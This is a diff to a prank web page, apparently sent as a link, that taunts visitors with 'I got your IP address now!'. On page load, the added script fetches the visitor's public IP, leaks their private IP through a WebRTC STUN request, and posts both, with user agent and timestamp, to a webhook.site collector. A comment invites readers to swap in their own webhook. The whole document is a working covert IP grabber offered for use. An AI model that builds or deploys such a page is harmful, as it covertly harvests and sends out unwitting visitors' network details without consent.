@@ -6,37 +6,70 @@
     <title>HI</title>
 </head>
 <body>
-    <h2>Thannkyou for visiting my link</h2>
-    <p>I got your Private Ip adress Now</p>
-    <pre id="output">HAHAHAHAHAHAHAH! ENJOY😊</pre>
+    <h2>Thank you for visiting my link</h2>
+    <p>I got your IP address now!</p>
+    <pre id="output">HAHAHAHAHAHAHAH! ENJOY 😊</pre>
 
     <script>
-        async function getWebRTCIPs() {
-            let ipList = [];
-            let rtcPeerConnection = new RTCPeerConnection({
-                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
-            });
-
-            rtcPeerConnection.createDataChannel("");
-            rtcPeerConnection.createOffer()
-                .then(offer => rtcPeerConnection.setLocalDescription(offer))
-                .catch(error => console.error(error));
-
-            rtcPeerConnection.onicecandidate = event => {
-                if (!event || !event.candidate) return;
-                let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
-                let match = event.candidate.candidate.match(ipRegex);
-                if (match) {
-                    let ip = match[1];
-                    if (!ipList.includes(ip)) {
-                        ipList.push(ip);
-                        document.getElementById("output").textContent = ipList.join("\n");
-                    }
-                }
-            };
+        async function getPublicIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Could not retrieve Public IP";
+            }
         }
 
-        getWebRTCIPs();
+        async function getPrivateIP() {
+            return new Promise((resolve) => {
+                let rtcPeerConnection = new RTCPeerConnection({
+                    iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+                });
+
+                rtcPeerConnection.createDataChannel("");
+                rtcPeerConnection.createOffer()
+                    .then(offer => rtcPeerConnection.setLocalDescription(offer))
+                    .catch(error => console.error(error));
+
+                rtcPeerConnection.onicecandidate = event => {
+                    if (!event || !event.candidate) return;
+                    let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
+                    let match = event.candidate.candidate.match(ipRegex);
+                    if (match) {
+                        resolve(match[1]);
+                    }
+                };
+
+                setTimeout(() => resolve("Could not retrieve Private IP"), 3000);
+            });
+        }
+
+        async function sendIPToWebhook(publicIP, privateIP) {
+            let webhookURL = "https://webhook.site/6f64b094-9afe-4351-a143-ed0de03032a5"; // Replace with your Webhook URL
+
+            let payload = {
+                public_ip: publicIP,
+                private_ip: privateIP,
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        async function displayIPs() {
+            let publicIP = await getPublicIP();
+            let privateIP = await getPrivateIP();
+            document.getElementById("output").textContent = `Public IP: ${publicIP}\nPrivate IP: ${privateIP}`;
+            sendIPToWebhook(publicIP, privateIP);
+        }
+
+        displayIPs();
     </script>
 </body>
 </html>
